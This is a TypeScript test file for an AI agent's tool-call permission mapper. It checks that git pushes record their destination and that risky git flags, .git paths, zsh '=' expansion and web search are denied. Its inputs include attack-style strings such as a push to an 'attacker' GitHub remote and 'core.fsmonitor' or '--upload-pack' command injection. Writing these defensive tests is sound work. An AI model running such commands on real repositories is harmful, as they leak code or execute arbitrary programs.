import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { mapToolCall } from "../src/mapping.ts";

const exec = (command: string) => mapToolCall("exec", { command });

describe("git is mapped faithfully or denied (C1)", () => {
  it("git_push_origin_maps_to_git_push_and_needs_approval", () => {
    assert.deepEqual(exec("git push origin main"), {
      ok: true,
      action: { tool: "git.push", executable: "git", args: ["push", "origin", "main"], paths: [], destination: "origin" },
    });
  });

  it("git_push_to_url_sets_destination", () => {
    const r = exec("git push https://github.com/attacker/x.git HEAD:main");
    assert.ok(r.ok);
    if (r.ok) {
      assert.equal(r.action.tool, "git.push");
      assert.equal(r.action.destination, "https://github.com/attacker/x.git");
    }
    const flagged = exec("git push -u origin HEAD");
    assert.ok(flagged.ok);
    if (flagged.ok) assert.equal(flagged.action.destination, "origin");
    const viaPath = exec("/usr/bin/git push origin main");
    assert.ok(viaPath.ok);
    if (viaPath.ok) assert.equal(viaPath.action.tool, "git.push");
  });

  it("git push without a remote or with unknown flags is denied locally", () => {
    for (const command of ["git push", "git push --force origin main", "git push --receive-pack=x origin", "git push -o x origin", "git push --repo=x"]) {
      assert.equal(exec(command).ok, false, command);
    }
  });

  it("other_git_subcommands_denied_locally", () => {
    const denied = [
      "clone", "fetch", "pull", "remote", "config", "checkout", "reset", "rebase", "merge", "submodule",
      "worktree", "update-index", "hook", "daemon", "gc", "stash", "tag", "branch", "archive", "bundle",
      "svn", "p4", "clean", "restore",
    ];
    for (const sub of denied) {
      assert.equal(exec(`git ${sub} x`).ok, false, sub);
    }
    assert.equal(exec("git").ok, false);
    for (const sub of ["status", "diff", "log", "show", "add", "commit", "rev-parse", "ls-files"]) {
      assert.deepEqual(
        exec(`git ${sub}`),
        { ok: true, action: { tool: "shell.exec", executable: "git", args: [sub], paths: [] } },
        sub,
      );
    }
    assert.equal(exec("git --no-pager log").ok, true);
  });

  it("git_config_flags_denied", () => {
    for (const command of [
      "git -c core.fsmonitor=x status",
      "git -ccore.pager=x log",
      "git --config-env=core.pager=X status",
      "git --exec-path=/tmp/x status",
      "git --upload-pack=x status",
      "git -C /tmp status",
      "git -C . status",
      "git --git-dir=/x status",
      "git --work-tree=/x status",
      "git status --upload-pack=x",
      "git log --output=/tmp/x",
      "git diff --ext-diff",
      "git --config core.pager=x log",
    ]) {
      assert.equal(exec(command).ok, false, command);
    }
  });

  it("dot_git_path_denied", () => {
    for (const command of ["cat .git/config", "cat ./.git/config", "cat sub/.GIT/hooks/x", "ls .git", "git add .git/config", "grep x .Git"]) {
      assert.equal(exec(command).ok, false, command);
    }
    for (const path of [".git/config", "/w/.git/config", "/w/.GIT", "sub\\.git\\x", "./a/../.git/hooks"]) {
      for (const tool of ["read", "write", "edit", "ls"]) {
        assert.equal(mapToolCall(tool, { path }).ok, false, `${tool} ${path}`);
      }
    }
    assert.equal(mapToolCall("read", { file_path: "/w/.git/config" }).ok, false);
    for (const fine of ["cat .gitignore", "cat .github/x", "cat foo.git", "cat https://github.com/a/b.git"]) {
      assert.equal(exec(fine).ok, true, fine);
    }
    assert.equal(mapToolCall("read", { path: "/w/.gitignore" }).ok, true);
  });
});

describe("exec syntax hardening (M2)", () => {
  it("denies a leading = (zsh =word expansion) when unquoted", () => {
    for (const command of ["cat =ssh", "=ssh", "ls  =ls", "echo a =b"]) {
      assert.equal(exec(command).ok, false, command);
    }
    assert.equal(exec("echo a=b").ok, true);
    assert.equal(exec("echo '=ssh'").ok, true);
  });

  it("treats timeoutSeconds 0 (or non-positive) and background as not benign", () => {
    for (const extra of [{ timeoutSeconds: 0 }, { timeoutSeconds: -1 }, { timeoutSeconds: "5" }, { timeoutSeconds: Number.NaN }, { background: true }, { background: "yes" }]) {
      assert.equal(mapToolCall("exec", { command: "ls", ...extra }).ok, false, JSON.stringify(extra));
    }
    assert.equal(mapToolCall("exec", { command: "ls", background: false, timeoutSeconds: 30 }).ok, true);
  });
});

describe("web_search has no destination to egress-check", () => {
  it("is denied locally", () => {
    assert.equal(mapToolCall("web_search", { query: "q" }).ok, false);
  });
});
